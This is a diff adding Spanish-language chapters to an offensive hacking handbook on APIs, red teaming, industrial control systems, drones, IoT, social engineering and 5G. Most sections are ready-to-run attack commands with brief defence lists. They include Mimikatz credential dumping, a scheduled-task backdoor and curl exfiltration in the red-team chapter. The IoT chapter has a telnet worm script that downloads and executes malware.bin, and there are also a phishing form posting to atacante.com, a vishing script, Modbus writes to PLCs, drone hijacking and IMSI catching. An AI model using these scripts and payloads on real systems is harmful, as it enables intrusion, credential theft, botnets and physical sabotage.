@@ -5239,13 +5239,1284 @@ El OSINT avanzado convierte datos dispersos en inteligencia precisa. En un pente
 ---
 
 
-# **Capítulo 29 – Cierre, Despedida y Declaración Final**
+
+# **Capítulo 29 – Ataques a APIs y Microservicios**
+
+*Explotando el esqueleto invisible de las aplicaciones modernas*
+
+---
+
+## 29.1. Introducción
+
+Las **APIs (Application Programming Interfaces)** y los **microservicios** son la columna vertebral de las aplicaciones modernas. Permiten que distintos módulos y sistemas se comuniquen, intercambien datos y ejecuten funciones.
+Pero su gran ventaja —la interconexión y apertura— es también su punto débil.
+En un pentest ofensivo, las APIs son objetivos de alto valor porque:
+
+* Manejan datos sensibles.
+* Están expuestas a Internet.
+* A menudo carecen de la misma protección que las interfaces de usuario.
+
+Ejemplos de vulnerabilidades reales:
+
+* **Broken Object Level Authorization (BOLA)**: acceso a datos de otros usuarios cambiando un ID.
+* **Falta de validación de entrada**: inyección SQL o comando.
+* **Exposición excesiva de datos**: APIs que devuelven más de lo necesario.
+* **Mala gestión de tokens y claves**.
+
+---
+
+## 29.2. Arquitectura Básica de APIs y Microservicios
+
+| Componente             | Descripción                                             |
+| ---------------------- | ------------------------------------------------------- |
+| Gateway/API Management | Controla acceso y rutas                                 |
+| Microservicios         | Funciones independientes que se comunican vía HTTP/gRPC |
+| Base de datos          | Fuente de datos, conectada a microservicios             |
+| Autenticación          | OAuth 2.0, JWT, API keys                                |
+
+---
+
+## 29.3. Principales Vulnerabilidades según OWASP API Security Top 10
+
+1. **BOLA** – Control deficiente de acceso a objetos.
+2. **Broken User Authentication** – Fallos en autenticación.
+3. **Excessive Data Exposure** – Respuestas demasiado detalladas.
+4. **Lack of Resources & Rate Limiting** – Sin límites de peticiones.
+5. **Broken Function Level Authorization** – Funciones expuestas sin control.
+6. **Mass Assignment** – Asignación masiva de campos no permitidos.
+7. **Security Misconfiguration** – Configuración insegura.
+8. **Injection** – SQL, NoSQL, Command Injection.
+9. **Improper Assets Management** – Versiones antiguas no deshabilitadas.
+10. **Insufficient Logging & Monitoring** – Falta de detección.
+
+---
+
+## 29.4. Laboratorio – API BOLA (Broken Object Level Authorization)
+
+Supongamos que tenemos:
+
+```
+GET /api/user/123/profile
+```
+
+Si cambiamos el ID:
+
+```
+GET /api/user/124/profile
+```
+
+y obtenemos datos de otro usuario, la API está vulnerable.
+
+Prueba en **Burp Suite**:
+
+1. Capturar la solicitud.
+2. Modificar `123` por `124`.
+3. Revisar si devuelve datos no autorizados.
+
+---
+
+## 29.5. Laboratorio – Inyección SQL en API
+
+```bash
+curl -X POST https://api.empresa.com/login \
+-H "Content-Type: application/json" \
+-d '{"username":"admin' OR '1'='1", "password":"123"}'
+```
+
+Si la API devuelve token válido, es vulnerable a inyección SQL.
+
+---
+
+## 29.6. Laboratorio – Exposición de Datos
+
+Algunas APIs devuelven estructuras completas:
+
+```json
+{
+  "id":123,
+  "name":"Juan Pérez",
+  "email":"juan@empresa.com",
+  "password_hash":"$2y$10$..."
+}
+```
+
+Esto facilita ataques de cracking offline.
+
+---
+
+## 29.7. Laboratorio – Abuso de Rate Limit
+
+```bash
+for i in {1..1000}; do
+  curl https://api.empresa.com/login -d '{"user":"a","pass":"b"}'
+done
+```
+
+Si no hay bloqueo, es vulnerable a fuerza bruta.
+
+---
+
+## 29.8. Ataques a Microservicios Internos
+
+* **Pivoting**: comprometer un microservicio y usarlo para atacar otros internos.
+* **Deserialización insegura**: enviar objetos manipulados para ejecutar código.
+* **Inyección NoSQL** en bases como MongoDB:
+
+```bash
+curl -X POST https://api.empresa.com/search \
+-d '{"query": {"$ne": null}}'
+```
+
+---
+
+## 29.9. Ejercicio Práctico Completo
+
+1. Montar API vulnerable (por ejemplo, `VAmPI` o `DVGA` en Docker).
+2. Detectar vulnerabilidades:
+
+   * BOLA
+   * Mass Assignment
+   * Injection
+3. Documentar hallazgos con pruebas en Burp Suite.
+4. Implementar payloads de explotación.
+
+---
+
+## 29.10. Detección y Defensa
+
+* Implementar **autorización a nivel de objeto y función**.
+* Limitar datos en respuestas.
+* Usar validación estricta de entrada.
+* Implementar rate limiting.
+* Autenticación fuerte con OAuth 2.0/JWT.
+* Cifrado TLS en tránsito.
+
+---
+
+## 29.11. Cierre
+
+Las APIs y microservicios son un campo de batalla invisible: mientras el usuario ve una interfaz bonita, debajo hay decenas de rutas y funciones esperando ser exploradas. El atacante que entienda su lógica puede moverse como un fantasma en el backend.
+
+---
+
+💡 **TIP Black-Hat Ético:** cada endpoint de API es como una puerta; algunas están cerradas, otras solo parecen cerradas.
+
+---
+
+
+# **Capítulo 30 – Red Teaming Avanzado**
+
+*Operaciones ofensivas integrales para medir la defensa real*
+
+---
+
+## 30.1. Introducción
+
+El **Red Teaming** es una simulación ofensiva realista diseñada para poner a prueba las defensas de una organización en un escenario que imita un ataque verdadero.
+A diferencia de un pentest tradicional, que se centra en encontrar vulnerabilidades técnicas específicas, el Red Team busca:
+
+* Evaluar la **respuesta completa** de la organización (detección, reacción y contención).
+* Integrar técnicas **técnicas, físicas y sociales**.
+* Operar como lo haría un actor de amenazas real, con planificación, sigilo y persistencia.
+
+> Aquí no se trata de romper sistemas “por romperlos”, sino de replicar una intrusión completa desde la fase de reconocimiento hasta la exfiltración.
+
+---
+
+## 30.2. Roles Clave en una Operación Red Team
+
+| Rol        | Función                                                       |
+| ---------- | ------------------------------------------------------------- |
+| Red Team   | Simula al atacante, coordina la operación ofensiva.           |
+| Blue Team  | Equipo de defensa, encargado de detectar y mitigar.           |
+| White Team | Supervisión neutral, garantiza el cumplimiento de las reglas. |
+
+---
+
+## 30.3. Fases del Red Teaming Avanzado
+
+1. **Reconocimiento (OSINT y escaneo)**
+   Recopilar inteligencia sobre personas, infraestructura y defensas.
+2. **Intrusión inicial**
+   Usar phishing, explotación de vulnerabilidades, acceso físico o ingeniería social.
+3. **Escalada de privilegios**
+   Comprometer cuentas privilegiadas.
+4. **Movimiento lateral**
+   Pasar de un sistema a otro en la red interna.
+5. **Persistencia**
+   Instalar backdoors y mecanismos de acceso a largo plazo.
+6. **Exfiltración de datos**
+   Sacar información sin detección.
+7. **Reporte y simulacro de respuesta**
+   Medir qué tan rápido y eficaz fue la reacción del Blue Team.
+
+---
+
+## 30.4. Laboratorio de Red Teaming – Escenario Completo
+
+**Objetivo ficticio:** Empresa Demo S.A.
+
+### Paso 1 – Reconocimiento
+
+```bash
+theHarvester -d empresa-demo.com -b google,linkedin
+shodan search "org:\"Empresa Demo S.A.\""
+```
+
+Resultado: se identifican correos, tecnología usada y servidores expuestos.
+
+### Paso 2 – Acceso inicial vía Spear Phishing
+
+Usar **SET (Social Engineering Toolkit)**:
+
+```bash
+setoolkit
+# Social-Engineering Attacks > Website Attack Vectors > Credential Harvester
+```
+
+Enviar correo falso con login corporativo.
+
+### Paso 3 – Escalada de privilegios
+
+En host comprometido (Windows):
+
+```powershell
+whoami /priv
+Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
+```
+
+### Paso 4 – Movimiento lateral
+
+```bash
+crackmapexec smb 192.168.1.0/24 -u admin -p password
+```
+
+### Paso 5 – Persistencia
+
+```powershell
+schtasks /create /sc minute /mo 30 /tn "Updater" /tr "powershell -File C:\backdoor.ps1"
+```
+
+### Paso 6 – Exfiltración
+
+```bash
+tar czf - datos/ | openssl enc -aes-256-cbc -k clave | curl -X POST --data-binary @- https://192.168.1.50/upload
+```
+
+---
+
+## 30.5. Herramientas Clave en Red Teaming
+
+* **Cobalt Strike / Sliver** – Frameworks de C2.
+* **Metasploit Framework** – Explotación.
+* **BloodHound** – Mapeo de Active Directory.
+* **Empire** – Post-explotación en PowerShell.
+* **Gophish** – Campañas de phishing.
+
+---
+
+## 30.6. Simulación de Blue Team
+
+Durante el ejercicio, el Blue Team debe:
+
+* Detectar patrones anómalos en logs.
+* Bloquear IPs y credenciales comprometidas.
+* Activar protocolos de respuesta a incidentes.
+
+---
+
+## 30.7. Métricas para Medir Éxito
+
+* **Tiempo hasta detección** (TTD).
+* **Tiempo hasta contención** (TTC).
+* Número de pasos del atacante sin ser detectado.
+* Impacto potencial de la exfiltración.
+
+---
+
+## 30.8. Ejercicio Práctico Completo
+
+1. Armar laboratorio con 3 VMs (victima, atacante, SIEM).
+2. Ejecutar fases de Red Teaming descritas.
+3. Registrar tiempo que tarda el Blue Team en detectar cada fase.
+4. Generar informe con recomendaciones.
+
+---
+
+## 30.9. Detección y Defensa
+
+* Uso de **SIEM** para correlación de eventos.
+* Segmentación de red para limitar movimiento lateral.
+* Monitoreo de endpoints con EDR.
+* Ejercicios de Red vs Blue regulares.
+
+---
+
+## 30.10. Cierre
+
+El Red Teaming avanzado es la prueba de fuego para cualquier organización: no mide cuántos parches tiene, sino cómo responde cuando todo falla.
+
+---
+
+💡 **TIP Black-Hat Ético:** en una operación real, el sigilo vale más que la velocidad.
+
+---
+
+
+# **Capítulo 31 – Hacking de Infraestructura Crítica**
+
+*ICS, SCADA y redes industriales: cuando un exploit apaga una ciudad*
+
+---
+
+## 31.1. Introducción
+
+La **infraestructura crítica** abarca sistemas que sostienen servicios esenciales: electricidad, agua, transporte, petróleo, gas y manufactura industrial.
+Estos entornos utilizan **ICS (Industrial Control Systems)** y **SCADA (Supervisory Control and Data Acquisition)** para monitorear y controlar procesos físicos.
+Un ataque exitoso contra estas redes puede:
+
+* Cortar el suministro eléctrico.
+* Contaminar agua potable.
+* Provocar fallos en plantas industriales.
+* Generar pérdidas económicas y caos social.
+
+Ejemplos históricos:
+
+* **Stuxnet (2010)**: malware que saboteó centrifugadoras nucleares iraníes.
+* **BlackEnergy (2015)**: apagón masivo en Ucrania.
+* **Triton/Trisis (2017)**: malware contra sistemas de seguridad industrial.
+
+---
+
+## 31.2. Arquitectura de un Sistema Industrial
+
+| Capa                | Componentes                           | Ejemplos            |
+| ------------------- | ------------------------------------- | ------------------- |
+| Capa empresarial    | ERP, correo, sistemas administrativos | SAP, Office 365     |
+| Capa de control     | SCADA, HMI (Human Machine Interface)  | Wonderware, WinCC   |
+| Capa de campo       | PLC, RTU, sensores, actuadores        | Siemens S7, Modicon |
+| Red de comunicación | Protocolos industriales               | Modbus, DNP3, OPC   |
+
+---
+
+## 31.3. Protocolos Industriales y Riesgos
+
+| Protocolo       | Uso                          | Vulnerabilidades comunes           |
+| --------------- | ---------------------------- | ---------------------------------- |
+| **Modbus/TCP**  | Comunicación PLC–SCADA       | Sin cifrado ni autenticación       |
+| **DNP3**        | Redes eléctricas             | Tráfico en texto claro             |
+| **OPC**         | Interoperabilidad industrial | Falta de segmentación              |
+| **EtherNet/IP** | Redes industriales           | Modificación de parámetros en vivo |
+
+---
+
+## 31.4. Fases de un Ataque ICS/SCADA
+
+1. **Reconocimiento** – Identificar dispositivos y protocolos.
+2. **Acceso inicial** – Phishing, VPN comprometida o exposición directa.
+3. **Enumeración** – Mapear PLCs, HMIs y controladores.
+4. **Manipulación** – Cambiar parámetros, alterar lecturas, forzar apagados.
+5. **Persistencia** – Mantener acceso sin ser detectado.
+6. **Encubrimiento** – Borrar logs y restaurar valores aparentes.
+
+---
+
+## 31.5. Laboratorio – Descubrimiento de Dispositivos Industriales con Shodan
+
+Buscar PLC Siemens expuestos:
+
+```bash
+shodan search "Siemens S7"
+```
+
+Buscar dispositivos Modbus:
+
+```bash
+shodan search "port:502 modbus"
+```
+
+Esto devuelve direcciones IP, banners y ubicación geográfica.
+
+---
+
+## 31.6. Laboratorio – Interacción con Modbus
+
+Usando `modbus-cli`:
+
+```bash
+modbus read --ip 192.168.1.100 --port 502 --unit 1 --address 0 --quantity 10
+```
+
+Esto lee registros de un PLC ficticio en laboratorio.
+
+Escritura (⚠ solo en entorno de pruebas):
+
+```bash
+modbus write --ip 192.168.1.100 --port 502 --unit 1 --address 5 --value 1
+```
+
+Activa o desactiva un actuador.
+
+---
+
+## 31.7. Escenario de Intrusión ICS
+
+1. **Reconocimiento externo**: Shodan revela IP con puerto 502 abierto.
+2. **Acceso inicial**: VPN mal configurada permite entrar a la red industrial.
+3. **Enumeración**: escaneo interno con `nmap` y scripts NSE industriales:
+
+```bash
+nmap -p502 --script modbus-discover 192.168.1.0/24
+```
+
+4. **Manipulación**: cambio de parámetros críticos en PLC.
+5. **Exfiltración**: copiar planos y configuraciones de planta.
+
+---
+
+## 31.8. Ataques Avanzados
+
+* **Replay attacks**: capturar comandos válidos y reproducirlos para alterar procesos.
+* **Man-in-the-Middle industrial**: interceptar Modbus/TCP y modificar valores.
+* **Firmware attacks**: subir firmware modificado al PLC.
+
+Ejemplo con `Bettercap`:
+
+```bash
+bettercap -iface eth0
+set modbus.spoof on
+```
+
+---
+
+## 31.9. Ejercicio Completo de Laboratorio ICS
+
+1. Instalar **OpenPLC** y **ScadaBR** en VMs.
+2. Conectar ambas simulando planta industrial.
+3. Usar `nmap` y `modbus-cli` para leer y modificar registros.
+4. Documentar cambios y simular impacto.
+
+---
+
+## 31.10. Contramedidas y Defensa
+
+* **Segmentación de red**: separar IT de OT (Operational Technology).
+* **Firewalls industriales** y listas blancas de dispositivos.
+* **Cifrado y autenticación** en protocolos industriales (cuando sea posible).
+* **Monitoreo continuo** con IDS/IPS para ICS (ej: Snort, Zeek, Dragos).
+* Capacitación de operadores para detectar anomalías.
+
+---
+
+## 31.11. Cierre
+
+Hackear infraestructura crítica es hackear el mundo físico. Aquí, un exploit no solo roba datos: puede dañar vidas y paralizar ciudades.
+En Red Teaming, simular ataques ICS/SCADA con ética y control es vital para fortalecer estas redes.
+
+---
+
+💡 **TIP Black-Hat Ético:** en el mundo industrial, un bit mal colocado puede tener el peso de una bomba.
+
+---
+
+
+# **Capítulo 32 – Hacking con Drones y Dispositivos Autónomos**
+
+*Tomando el control del cielo y la tierra sin poner un pie en el objetivo*
+
+---
+
+## 32.1. Introducción
+
+Los **drones** (UAV – Unmanned Aerial Vehicles) y los **dispositivos autónomos** han dejado de ser simples juguetes para convertirse en herramientas críticas para logística, seguridad, agricultura, transporte y operaciones militares.
+Su creciente uso los ha convertido en un objetivo atractivo para:
+
+* Espionaje.
+* Sabotaje.
+* Robo de datos.
+* Acceso físico remoto.
+
+Al igual que en otros sistemas conectados, la seguridad de los drones a menudo queda relegada frente a la funcionalidad y el costo.
+
+---
+
+## 32.2. Principales Superficies de Ataque
+
+| Superficie               | Ejemplo de vulnerabilidad                                           |
+| ------------------------ | ------------------------------------------------------------------- |
+| **Comunicación RF**      | Interceptación y suplantación de señal entre control remoto y dron. |
+| **GPS**                  | Spoofing o jamming para alterar navegación.                         |
+| **Firmware**             | Modificación para desbloquear restricciones o instalar backdoors.   |
+| **Aplicaciones móviles** | Inyección de código o manipulación de APIs.                         |
+| **Wi-Fi**                | Compromiso de red para control remoto.                              |
+| **Sensores**             | Manipulación de datos de cámaras, LIDAR o IMU.                      |
+
+---
+
+## 32.3. Protocolos Comunes y Riesgos
+
+* **DJI Lightbridge / OcuSync** – Comunicación cifrada, pero susceptible a vulnerabilidades en firmware.
+* **MAVLink** – Muy usado en drones DIY y profesionales; en versiones antiguas no cifradas, permite interceptar y modificar comandos.
+* **Wi-Fi estándar** – En modelos de consumo, a menudo con contraseñas débiles por defecto.
+
+---
+
+## 32.4. Laboratorio – Interceptación de MAVLink
+
+Instalar **MAVProxy** en Kali:
+
+```bash
+sudo apt install mavproxy
+mavproxy.py --master=udp:0.0.0.0:14550
+```
+
+Si el dron envía telemetría por UDP sin cifrar, podrás leer y enviar comandos:
+
+```bash
+mode GUIDED
+arm throttle
+takeoff 10
+```
+
+⚠ Esto **solo** debe hacerse con drones propios en entorno controlado.
+
+---
+
+## 32.5. GPS Spoofing
+
+Usar **gps-sdr-sim** con SDR (Software Defined Radio):
+
+```bash
+gps-sdr-sim -e brdc3540.14n -l 40.6892,-74.0445,100
+```
+
+Esto simula señal GPS para "engañar" al dron y cambiar su ubicación percibida.
+
+---
+
+## 32.6. Hacking de Aplicaciones de Control
+
+1. Decompilar APK de la app del dron:
+
+```bash
+apktool d drone_app.apk
+```
+
+2. Buscar claves API o endpoints internos.
+3. Modificar parámetros como límites de altura o zonas restringidas (No-Fly Zones).
+
+---
+
+## 32.7. Ejemplo de Ataque Wi-Fi
+
+Muchos drones crean su propia red Wi-Fi:
+
+```bash
+airmon-ng start wlan0
+airodump-ng wlan0mon
+```
+
+Capturar handshake y crackear clave con `aircrack-ng`:
+
+```bash
+aircrack-ng captura.cap -w diccionario.txt
+```
+
+Si es débil, se obtiene acceso completo al dron.
+
+---
+
+## 32.8. Escenario de Intrusión Completo
+
+1. **Reconocimiento RF**: escaneo de espectro con `rtl_power` para encontrar frecuencia.
+2. **Interceptar telemetría** vía MAVLink.
+3. **Enviar comandos falsos** para cambiar destino.
+4. **Desactivar cámara** para evitar detección.
+5. **Aterrizar en punto controlado** para captura física.
+
+---
+
+## 32.9. Hacking de Robots y Vehículos Autónomos
+
+Además de drones, muchos dispositivos autónomos usan protocolos similares:
+
+* **ROS (Robot Operating System)** – Comunicación sin cifrar por defecto.
+* **CAN Bus** – En vehículos, permite manipular funciones críticas.
+
+Ejemplo de lectura de ROS:
+
+```bash
+rostopic list
+rostopic echo /cmd_vel
+```
+
+Si no está protegido, se pueden inyectar comandos de movimiento.
+
+---
+
+## 32.10. Ejercicio Completo de Laboratorio
+
+1. Montar dron con autopiloto **ArduPilot** en simulador SITL.
+2. Configurar MAVLink sin cifrar.
+3. Interceptar y modificar comandos con MAVProxy.
+4. Documentar impacto y vector de entrada.
+
+---
+
+## 32.11. Contramedidas
+
+* Usar versiones cifradas de MAVLink (MAVLink2).
+* Cambiar contraseñas Wi-Fi por defecto.
+* Firmar y verificar firmware antes de instalarlo.
+* Usar GPS con autenticación (cuando sea posible).
+* Segmentar redes entre control y telemetría.
+
+---
+
+## 32.12. Cierre
+
+Hackear drones y dispositivos autónomos no es ciencia ficción: hoy es posible manipular su comportamiento con herramientas de bajo costo. En manos equivocadas, un dron comprometido es una amenaza aérea; en manos de un pentester ético, es una oportunidad para reforzar defensas antes de que sea tarde.
+
+---
+
+💡 **TIP Black-Hat Ético:** en la guerra digital, controlar el cielo puede ser más decisivo que dominar la tierra.
+
+---
+
+
+# **Capítulo 33 – Explotación de IoT Masivo**
+
+*Cuando miles de dispositivos inteligentes se convierten en un ejército*
+
+---
+
+## 33.1. Introducción
+
+El **Internet de las Cosas (IoT)** ha crecido de forma explosiva: cámaras IP, asistentes de voz, cerraduras inteligentes, electrodomésticos conectados, sistemas de climatización y hasta sensores industriales.
+Su proliferación masiva ha creado un **territorio fértil para ataques** porque:
+
+* Muchos dispositivos carecen de actualizaciones de seguridad.
+* Se usan contraseñas por defecto.
+* Están siempre conectados a Internet.
+* Suelen estar mal segmentados de la red principal.
+
+Casos reales:
+
+* **Mirai Botnet (2016)**: millones de cámaras IP y routers usados para ataques DDoS masivos.
+* **Hajime** y **Mozi**: redes botnet P2P que comprometen IoT y se auto-propagan.
+* **Reaper**: botnet que explota vulnerabilidades en lugar de solo credenciales débiles.
+
+---
+
+## 33.2. Superficie de Ataque IoT
+
+| Vector                      | Ejemplo                                           |
+| --------------------------- | ------------------------------------------------- |
+| **Contraseñas por defecto** | admin\:admin, root:1234                           |
+| **Puertos abiertos**        | Telnet, SSH, HTTP sin cifrar                      |
+| **Firmware inseguro**       | Backdoors, sin firma digital                      |
+| **Protocolos inseguros**    | UPnP, MQTT, RTSP                                  |
+| **Servicios expuestos**     | Paneles de administración accesibles públicamente |
+
+---
+
+## 33.3. Reconocimiento Masivo
+
+El primer paso en la explotación IoT masiva es **descubrir dispositivos vulnerables**.
+
+### Ejemplo con Shodan
+
+Buscar cámaras IP con panel web:
+
+```bash
+shodan search "Server: GoAhead-Webs"
+```
+
+Buscar routers con Telnet abierto:
+
+```bash
+shodan search "port:23 country:AR"
+```
+
+### Ejemplo con Censys
+
+```bash
+censys search 'services.service_name: "TELNET" AND location.country_code: "AR"'
+```
+
+---
+
+## 33.4. Escaneo y Enumeración Masiva
+
+```bash
+nmap -p 23,80,554 --open 190.0.0.0/8 --script banner
+```
+
+* `port 23` = Telnet
+* `port 80` = Panel web
+* `port 554` = Streaming RTSP
+
+---
+
+## 33.5. Explotación de Credenciales por Defecto
+
+Usando **Hydra** para fuerza bruta:
+
+```bash
+hydra -L users.txt -P passwords.txt telnet://192.168.1.100
+```
+
+Si el fabricante no obliga a cambiar credenciales, el acceso suele ser trivial.
+
+---
+
+## 33.6. Acceso a Streams de Cámaras IP
+
+Si RTSP está abierto y sin credenciales:
+
+```bash
+vlc rtsp://192.168.1.101:554/stream1
+```
+
+Esto permite ver video en vivo sin autorización.
+
+---
+
+## 33.7. Inyección en Paneles Web IoT
+
+Muchos dispositivos usan servidores HTTP minimalistas y vulnerables a:
+
+* **XSS**
+* **Command Injection**
+* **Directory Traversal**
+
+Ejemplo de inyección:
+
+```bash
+curl "http://192.168.1.105/cgi-bin/admin.cgi?cmd=ls../../etc"
+```
+
+---
+
+## 33.8. Escenario de Botnet IoT en Laboratorio
+
+1. **Objetivo**: comprometer 10 cámaras IP simuladas en Docker.
+2. Escanear con Nmap para detectar IPs activas.
+3. Conectarse vía Telnet con credenciales por defecto.
+4. Subir binario malicioso que abra conexión reversa.
+5. Coordinar ataques DDoS desde todos los nodos.
+
+---
+
+## 33.9. Laboratorio – Propagación Automática
+
+Usar un script en Python para buscar nuevos dispositivos y comprometerlos:
+
+```python
+import telnetlib
+
+targets = ["192.168.1.101", "192.168.1.102"]
+
+for ip in targets:
+    try:
+        tn = telnetlib.Telnet(ip)
+        tn.read_until(b"login: ")
+        tn.write(b"admin\n")
+        tn.read_until(b"Password: ")
+        tn.write(b"admin\n")
+        tn.write(b"wget http://192.168.1.50/malware.bin -O /tmp/m\n")
+        tn.write(b"chmod +x /tmp/m && /tmp/m\n")
+        tn.close()
+    except:
+        pass
+```
+
+⚠ **Solo en entorno de pruebas controlado.**
+
+---
+
+## 33.10. Explotación de MQTT
+
+Muchos dispositivos usan **MQTT** sin autenticación.
+
+```bash
+mosquitto_sub -h broker.iot.local -t "#"
+```
+
+Esto suscribe a todos los tópicos y permite espiar o inyectar comandos.
+
+---
+
+## 33.11. Defensa Contra Explotación IoT Masiva
+
+* Cambiar contraseñas por defecto al primer uso.
+* Actualizar firmware periódicamente.
+* Deshabilitar servicios no usados (Telnet, UPnP).
+* Usar firewalls y segmentación de red.
+* Implementar cifrado en protocolos IoT (MQTT sobre TLS).
+
+---
+
+## 33.12. Cierre
+
+La explotación de IoT masivo demuestra que **la seguridad del sistema más débil es la seguridad de toda la red**. Un solo dispositivo vulnerable puede abrir la puerta a un ataque coordinado de gran escala.
+
+---
+
+💡 **TIP Black-Hat Ético:** en un enjambre IoT, un dispositivo comprometido es un virus; cien, son una pandemia.
+
+---
+
+
+# **Capítulo 34 – Ingeniería Social Avanzada**
+
+*El arte de hackear personas antes que máquinas*
+
+---
+
+## 34.1. Introducción
+
+La **ingeniería social** es la manipulación psicológica de personas para que revelen información, realicen acciones o permitan accesos que normalmente no darían.
+En seguridad ofensiva, la ingeniería social es tan importante como las vulnerabilidades técnicas: la defensa más fuerte puede caer si alguien abre la puerta.
+
+Casos reales:
+
+* **Kevin Mitnick** accedió a sistemas corporativos principalmente mediante engaños a empleados.
+* **Red Teamings corporativos** logran acceso físico disfrazándose de técnicos o personal de limpieza.
+* **Phishing dirigido (Spear Phishing)** compromete cuentas críticas en pocas horas.
+
+---
+
+## 34.2. Principios Psicológicos que Aprovecha la Ingeniería Social
+
+| Principio            | Ejemplo ofensivo                                                                |
+| -------------------- | ------------------------------------------------------------------------------- |
+| **Autoridad**        | “Soy del departamento de IT, necesito tu contraseña para resolver un problema.” |
+| **Urgencia**         | “Si no respondes en 10 minutos, tu cuenta será suspendida.”                     |
+| **Escasez**          | “Última oportunidad para acceder a esta oferta exclusiva.”                      |
+| **Reciprocidad**     | Dar un pequeño favor o regalo antes de pedir acceso.                            |
+| **Confianza previa** | Usar información personal para parecer legítimo.                                |
+
+---
+
+## 34.3. Tipos Avanzados de Ingeniería Social
+
+1. **Pretexting** – Crear una historia falsa y creíble para obtener datos.
+2. **Phishing Avanzado** – Emails o mensajes casi indistinguibles de los reales.
+3. **Vishing** – Ingeniería social por teléfono.
+4. **Smishing** – Phishing vía SMS.
+5. **Quid pro quo** – Ofrecer algo a cambio de credenciales o acceso.
+6. **Impersonación física** – Acceder a instalaciones con uniforme o acreditación falsa.
+
+---
+
+## 34.4. Escenarios Combinados
+
+Un ataque efectivo suele combinar varios métodos:
+
+1. **OSINT** para recopilar datos de la víctima (redes sociales, LinkedIn).
+2. **Spear phishing** usando esos datos para crear un email personalizado.
+3. **Llamada telefónica** de seguimiento para validar acceso.
+4. **Visita física** aprovechando la relación de confianza generada.
+
+---
+
+## 34.5. Laboratorio – Spear Phishing Personalizado
+
+**Paso 1 – Recolección de información con theHarvester**
+
+```bash
+theHarvester -d empresa-demo.com -b linkedin,google
+```
+
+**Paso 2 – Creación de email creíble**
+Usar plantilla HTML idéntica al portal corporativo.
+
+```html
+<form action="http://atacante.com/login" method="POST">
+  <input type="text" name="user">
+  <input type="password" name="pass">
+  <input type="submit" value="Iniciar sesión">
+</form>
+```
+
+**Paso 3 – Envío controlado**
+Usar **Gophish** para campañas controladas:
+
+```bash
+gophish
+```
+
+---
+
+## 34.6. Laboratorio – Pretexting Telefónico
+
+Preparar guion:
+
+> “Hola, soy Carlos de soporte técnico. Hemos detectado actividad sospechosa en tu cuenta y necesitamos verificar tu identidad. Por favor, indícame el código de verificación que te enviamos.”
+
+Se practica en entorno controlado con roles predefinidos.
+
+---
+
+## 34.7. Laboratorio – Ingreso Físico con Ingeniería Social
+
+Escenario de prueba:
+
+1. Vestirse con uniforme de proveedor de servicios (limpieza, telecomunicaciones).
+2. Portar carpeta con papeles falsos y credencial creíble.
+3. Entrar a la recepción y mencionar a un contacto interno real (obtenido por OSINT).
+4. Una vez dentro, evaluar accesos físicos.
+
+---
+
+## 34.8. Ataques de Ingeniería Social en Redes Sociales
+
+* **Catfishing**: Crear perfiles falsos para ganar confianza.
+* **Friend phishing**: Usar contactos de la víctima para obtener información.
+* **Gamificación**: Formularios “divertidos” que piden datos sensibles.
+
+---
+
+## 34.9. Ejercicio Completo – Campaña de Ingeniería Social
+
+**Objetivo:** Comprometer credenciales de acceso interno.
+
+1. **OSINT** – Recolectar emails, organigrama y tecnología usada.
+2. **Creación de pretexto** – Historia coherente para el ataque.
+3. **Fase de ataque** – Enviar phishing, llamar a víctimas y coordinar visita física.
+4. **Evaluación** – Medir porcentaje de éxito y tiempo de detección.
+5. **Informe** – Documentar vulnerabilidades humanas y proponer entrenamiento.
+
+---
+
+## 34.10. Contramedidas y Defensa
+
+* Capacitación regular de empleados.
+* Simulacros de phishing.
+* Verificación de identidad antes de dar información.
+* Protocolos de doble verificación para cambios críticos.
+* Política de “nunca compartir contraseñas”.
+
+---
+
+## 34.11. Cierre
+
+En seguridad ofensiva, la ingeniería social avanzada es la llave maestra: en lugar de forzar una puerta, se convence a alguien de que la abra.
+Un buen Red Team sabe que hackear personas requiere tanta planificación y precisión como hackear servidores.
+
+---
+
+💡 **TIP Black-Hat Ético:** un exploit bien escrito es peligroso, pero una historia bien contada puede ser imparable.
+
+---
+
+
+# **Capítulo 35 – Hacking de Redes 5G y Comunicaciones Avanzadas**
+
+*Explotando la columna vertebral de la hiperconectividad moderna*
+
+---
+
+## 35.1. Introducción
+
+Las redes **5G** no son solo una evolución de la tecnología móvil: representan una infraestructura crítica para IoT masivo, vehículos autónomos, telemedicina y ciudades inteligentes.
+Aunque prometen **mayor velocidad, baja latencia y mejor seguridad**, la realidad es que traen **nuevas superficies de ataque**:
+
+* Virtualización de funciones de red (**NFV**).
+* Redes definidas por software (**SDN**).
+* Conexiones masivas de dispositivos heterogéneos.
+* Protocolos complejos y nuevas dependencias.
+
+Ataques contra 5G pueden:
+
+* Interceptar comunicaciones.
+* Rastrear ubicación de usuarios.
+* Desplegar malware a escala masiva.
+* Interrumpir servicios críticos.
+
+---
+
+## 35.2. Arquitectura 5G en Breve
+
+| Componente              | Función                          | Riesgos                             |
+| ----------------------- | -------------------------------- | ----------------------------------- |
+| **gNodeB**              | Estación base 5G                 | Acceso físico o firmware vulnerable |
+| **Core 5G**             | Procesamiento central            | Explotación de APIs y NFV           |
+| **Edge Computing**      | Procesamiento cercano al usuario | Vulnerabilidades en nodos de borde  |
+| **UE (User Equipment)** | Dispositivos                     | Fallos en apps y firmware           |
+
+---
+
+## 35.3. Superficies de Ataque Clave
+
+1. **Plano de control (CP)** – Señalización y autenticación.
+2. **Plano de usuario (UP)** – Transmisión de datos.
+3. **Interfaces API expuestas** – En el core de red.
+4. **Virtualización** – Ataques a hipervisores y contenedores.
+5. **IoT masivo** – Dispositivos vulnerables como puerta de entrada.
+
+---
+
+## 35.4. Vulnerabilidades Históricas y Actualizadas
+
+* **SS7 / Diameter**: Protocolos heredados aún presentes en algunos entornos.
+* **Fuzzing en NAS y RRC**: Posible denegación de servicio al UE.
+* **Interceptación IMSI**: Uso de **IMSI catchers** para rastreo y captura de datos.
+
+---
+
+## 35.5. Laboratorio – IMSI Catching con Software Defined Radio (SDR)
+
+Instalar **srsRAN** en Kali Linux:
+
+```bash
+sudo apt install srsran
+```
+
+Ejecutar para detectar IMSI:
+
+```bash
+sudo srsenb
+sudo srsepc
+```
+
+Usar un SDR como **USRP B200** o **HackRF One** para simular estación base.
+
+---
+
+## 35.6. Ataques de Fuzzing al Plano de Control
+
+Usando **Boofuzz**:
+
+```python
+from boofuzz import *
+session = Session(target=Target(connection=SocketConnection("192.168.1.10", 36412, proto='udp')))
+session.connect(s_get("5G_NAS_Message"))
+session.fuzz()
+```
+
